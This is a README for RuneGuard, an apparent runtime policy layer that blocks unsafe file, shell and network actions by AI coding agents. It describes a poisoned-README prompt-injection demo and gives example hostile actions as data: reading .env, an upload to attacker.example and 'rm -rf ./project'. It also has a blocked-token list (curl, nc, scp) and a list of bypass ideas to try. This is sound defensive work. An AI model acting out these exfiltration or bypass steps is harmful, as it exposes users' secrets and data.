# RuneGuard

**Runtime enforcement for AI coding agents.**

RuneGuard sits between AI agents and the tools they use: files, shell commands, APIs, and network calls. Instead of only trying to make the model say safe things, RuneGuard controls what the agent is actually allowed to do at runtime.

## Problem

Coding agents are becoming powerful enough to read files, execute commands, call APIs, and move data across system boundaries.

That creates a new security problem: a prompt-injected or misaligned agent may try to access secrets, run destructive commands, or exfiltrate data.

Traditional prompt-level guardrails are not enough because the model can still attempt unsafe actions.

RuneGuard enforces policy at the action layer.

## Who this is for

RuneGuard is for developers and teams running coding agents in:

- local devboxes
- CI runners
- ephemeral sandboxes
- internal automation environments

## Quickstart

```bash
git clone https://github.com/nzhumasseiit/runeguard.git
cd runeguard
pip install -e .
runeguard check
runeguard demo
```

Run a command through the runtime shell policy:

```bash
runeguard run -- python -c "print('hello from guarded command')"
```

Evaluate an action without executing it:

```bash
runeguard eval read_file --path .env
runeguard eval http_post --url https://attacker.example/upload
runeguard eval shell --command "rm -rf ./project"
```

Write a JSONL audit log:

```bash
runeguard demo --audit-log .runeguard/audit.jsonl
```

Start the policy daemon for process-level interception:

```bash
runeguard daemon start --audit-log .runeguard/daemon.jsonl
```

On Linux, build and use the LD_PRELOAD shim:

```bash
runeguard shim build
runeguard run --preload -- python -c "open('.env').read()"
```

On Linux with BCC installed, trace runtime activity:

```bash
runeguard ebpf trace
```

## Demo

The demo simulates a poisoned README attack.

An agent is asked to summarize a repo. The README contains hidden malicious instructions telling the agent to read `.env` and send it to an external domain.

RuneGuard blocks the unsafe actions.

Expected output:

```text
[ALLOW] read_file({'path': 'examples/demo_repo/README.md'}) - allowed by policy
[BLOCK] read_file({'path': 'examples/demo_repo/.env'}) - protected path access
[BLOCK] http_post({'url': 'https://attacker.example/upload', ...}) - domain not allowlisted
[BLOCK] shell({'command': 'rm -rf ./project'}) - blocked shell command pattern
```

## Current Status

Working now:

- YAML policy loading
- `runeguard run -- <command>` wrapper
- `runeguard eval <tool>` dry policy evaluation
- Unix socket policy daemon
- Linux LD_PRELOAD shim source and build target
- BCC/eBPF tracer foundation for `execve`, `openat`, and `connect`
- agent integration helpers
- file access policy
- shell command policy
- network/domain policy
- readable allow/block logs
- JSONL audit logs
- poisoned prompt demo

Planned:

- process correlation
- eBPF-backed enforcement
- CI/devbox sandbox mode

## v1 Test Surface

This repo is ready for early breakage and feedback around the policy layer.

Useful things to try:

- path bypasses around `.env`, `secrets/`, `~/.ssh/`, relative paths, and nested directories
- shell bypasses around blocked tokens such as `rm -rf`, `curl`, `nc`, and `scp`
- URL/domain bypasses around subdomains, missing schemes, and attacker-controlled hosts
- LD_PRELOAD bypasses on Linux, especially static binaries, direct syscalls, and alternate libc paths
- daemon failure behavior with `RUNEGUARD_FAIL_CLOSED=0` versus the default fail-closed mode
- places where audit logs leak data that should be redacted
- places where the README implies stronger security than the code actually provides

## Vision

RuneGuard is a runtime permission layer for AI agents.

The long-term goal is to create a real boundary between agent intent and system truth: what the model says it will do versus what the system actually observes and allows.

## What RuneGuard Is Not Yet

RuneGuard is not a sandbox replacement yet.

It does not provide kernel-level enforcement in v1.

The current version is a policy plus tool-call enforcement prototype with Linux process visibility/interception foundations. The Python proxy controls actions routed through RuneGuard. The LD_PRELOAD shim only affects dynamically linked processes launched with the shim. The eBPF layer is visibility-first, not enforcement yet.

## Try To Break It

Ideas:

- make the agent read `.env`
- make it run `curl`, `nc`, or `scp`
- make it hide exfiltration inside a normal tool call
- make it access `~/.ssh`
- make the audit log expose something sensitive
